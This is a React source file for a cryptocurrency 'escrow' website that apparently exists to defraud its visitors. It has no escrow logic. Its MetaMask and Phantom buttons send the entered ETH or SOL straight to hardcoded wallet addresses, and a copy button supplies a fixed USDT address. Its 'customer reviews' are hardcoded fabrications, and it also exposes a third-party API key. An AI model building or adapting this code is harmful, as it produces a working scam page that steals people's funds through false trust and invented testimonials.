import * as solanaWeb3 from "@solana/web3.js";
import './App.css';
import {useEffect, useRef, useState} from "react";

const Title = 'Escrow Simple N Fast'
const image = 'https://www.citypng.com/public/uploads/small/31630703755mgh49e6bkjh6jyxpq1dxjiexkxahu5ujzofrzhntuguw4jhllwofw8c2ba7rr8xxakbejdahvrwjttcbjv7ii9gqp4q5tpw4zbym.png'

document.title = Title
document.getElementById('favicon').setAttribute('href', image)

const address = "r74VH5E1Hz3uRgG15RjywGPJ9Cztw2yKQszFhofRZT5"

function App() {
    const [opacity, setOpacity] = useState(0)
    const [ethAmount, setEthAmount] = useState(null)
    const [solAmount, setSolAmount] = useState(null)
    const [usdtAmountCopied, setUsdtAmountCopied] = useState(false)
    const firstItemRef = useRef(null);

    const [ethAmountUSD, setEthAmountUSD] = useState(null)
    const [solAmountUSD, setSolAmountUSD] = useState(null)

    const usdtAddress = 'TAk2MCppGLeu7dUyjz9m1ZGo8a4E5RFb53'

    const reviews = [
        {username: 'Dung Pham', review: 'Great service ever!', date: '16.06.22'},
        {username: 'Kit2 ETH', review: 'Excellent I appreciate!', date: '04.06.22'},
        {username: 'Hoseah Kiplang\'at Kapketui', review: 'Great customer service', date: '15.05.22'},
        {username: 'WILLIAM', review: 'Very helpful and speedy support', date: '10.05.22'},
        {username: 'Adam Mcdadi', review: 'It was great doing business through ESCROW. All steps were very easy to follow. What I like most is the communication with them. They were replying my messeges in a timely manner. They were very professional.', date: '12.04.22'},
        {username: 'Joseph Barmakian', review: 'The process was clearly laid out and followed precisely. I have utmost confidence in them and would highly recommend this service.', date: '02.04.22'},
        {username: 'Ron Booth', review: 'Jesse did and excellent job, completely professional and timely.', date: '27.03.22'},
        {username: 'Juli Augusto', review: 'Very helpful!', date: '19.03.22'},
        {username: 'Wouter Ghysens', review: 'Great platform to get a transaction done with. I\'m from Belgium, and had never worked with this before.', date: '13.03.22'},
        {username: 'SolBoy', review: 'Fast!', date: '12.03.22'},
        {username: 'Zeke S.', review: 'Amazing service+++', date: '09.03.22'},
        {username: 'Dirk H..', review: 'My sol bank was terrible, but Escrow support was amazing', date: '25.02.22'},
        {username: 'Guillaume V.', review: 'Good!', date: '18.02.22'},
        {username: 'Lisa G.', review: 'Amazing Service.', date: '03.02.22'},
        {username: 'Tom A.', review: 'Thank you, Jay, much appreciated', date: '01.02.22'},
        {username: 'Souvik B.', review: 'Safe and Smooth', date: '24.01.22'},
        {username: 'David P.', review: 'Courteous and professional escrow service', date: '10.01.22'},
        {username: 'Lance C.', review: 'Awesome Service!', date: '17.12.21'},

    ]

    const apikey = 'C4092161-AD35-4BBC-8B3D-558CB9A174B3'

    useEffect(() => {
        const getCryptoPrice = async () => {
            const baseURL = 'https://rest.coinapi.io/v1/assets/'
            const responseSOL = await fetch(`${baseURL}SOL?apikey=${apikey}`)
            const responseJsonSOL = await responseSOL.json()
            const responseETH = await fetch(`${baseURL}ETH?apikey=${apikey}`)
            const responseJsonETH = await responseETH.json()
            setEthAmountUSD(Number(responseJsonETH[0].price_usd))
            setSolAmountUSD(Number(responseJsonSOL[0].price_usd))
        }
        getCryptoPrice()
    }, [])

    const inputChangeHandlerETH = (e) => {
        setEthAmount(e.target.value)
    }

    const inputChangeHandlerSOL = (e) => {
        setSolAmount(e.target.value)
    }
    
    const copyToClipboard = async () => {
        await navigator.clipboard.writeText('TAk2MCppGLeu7dUyjz9m1ZGo8a4E5RFb53')
        const copied = await navigator.clipboard.readText()
        console.log(copied)
        setUsdtAmountCopied(true)
    }

    ////////////////// ETH/METAMASK

    const connectAndSendMetaMask = async (fromWallet) => {
        try {
            await sendEth()
        } catch (err) {
            console.log(err)
        }
    }

    const sendEth = async () => {
        const address = await window.ethereum.request({method: 'eth_requestAccounts'})

        let params = [{
            "from": address[0],
            "to": '0xAc1e81526bB869aA73B5B41D62dF4AD811df3d3B',
            "value": parseInt(Number(ethAmount) * 1000000000000000000).toString(16)
        }]

        const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
            console.log(err)
        })
    }

    ////////////// SOL/PHANTOM

    async function connectAndSendPhantom() {
        try {
            await window.solana.connect()
            await sendSol()
        } catch (error) {
            console.log(error)
        }
    }

    async function sendSol() {
        const provider = window.solana
        const connection = new solanaWeb3.Connection(
            solanaWeb3.clusterApiUrl('mainnet-beta'),
            'confirmed'
        )

        // const balance = await connection.getBalance(provider.publicKey)

        const toAccount = new solanaWeb3.PublicKey(address)

        let transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: provider.publicKey,
                toPubkey: toAccount,
                lamports: solanaWeb3.LAMPORTS_PER_SOL * Number(solAmount),
            })
        )

        transaction.feePayer = await provider.publicKey
        let blockhashObj = await connection.getRecentBlockhash()
        transaction.recentBlockhash = await blockhashObj.blockhash

        let signed = await provider.signTransaction(transaction)
        let signature = await connection.sendRawTransaction(signed.serialize())
        await connection.confirmTransaction(signature)
    }


    setTimeout(() => {
        setOpacity(100)
    }, 0)

    return (
        <>
            <div className={'AppContainer'}
                 ref={(el) => {
                     if (el) {
                         el.style.setProperty('opacity', opacity, 'important');
                     }
                 }}
            >
                <header>
                    <div className={'headerInner'}>
                        <div>
                            <a href={'/'}>{Title}</a>
                        </div>
                        <div onClick={() => firstItemRef.current.scrollIntoView({behavior: "smooth"})} className={'reviewHeaderButton'}>reviews</div>
                        <div>Minimum Commission</div>
                    </div>
                </header>
                <div className="App">
                    <div className="AppInner">
                        <div>
                            <div>
                                <div style={{marginLeft: '130px'}}>eth {ethAmount} {(ethAmount && ethAmountUSD) && '=' + (ethAmountUSD * ethAmount).toFixed(2) + '$'}</div>
                                <input type="number" onChange={inputChangeHandlerETH}/>
                            </div>
                            <button disabled={!ethAmount && true} onClick={connectAndSendMetaMask}>connect MetaMask
                            </button>
                        </div>
                        <div>
                            <div>
                                <div style={{marginLeft: '130px'}}>sol {solAmount} {(solAmount && solAmountUSD) && '=' + (solAmountUSD * solAmount).toFixed(2) + '$'}</div>
                                <input type="number" onChange={inputChangeHandlerSOL}/>
                            </div>
                            <button disabled={!solAmount && true} onClick={connectAndSendPhantom}>connect Phantom
                            </button>
                        </div>
                        <div style={{display: 'flex', alignItems: 'end'}}>
                            <div>
                            <div style={{marginLeft: '50px'}}>
                                <div style={{ fontSize: '35px'}}>usdt (TRC20)</div>
                                <div>
                                    <div style={{position: 'relative',fontSize: '25px'}}>{usdtAddress}<span style={{position: 'absolute', right: '-10px',display: usdtAmountCopied ? 'inline' : 'none', transition: '.9s'}}>copied</span></div>
                                    
                                </div>
                            </div>
                            <button style={{width: '340px'}} onClick={copyToClipboard}>copy address
                            </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div className={'reviews'}>
                <div ref={firstItemRef} style={{color: 'white', fontSize: '35px', borderBottom: '1px solid white'}}>reviews</div>
                <div>
                    {reviews.map(e => {
                        return(
                            <div className={'usernameNreview'}>
                                <div className={'username'}>{e.username} <span style={{fontSize: '20px', marginLeft: '20px', WebkitTextStroke: '0 red'}}>{e.date}</span></div>
                                <div className={'review'}>{e.review}</div>
                            </div>
                        )
                    })}
                </div>
            </div>
        </>
    );
}

export default App;
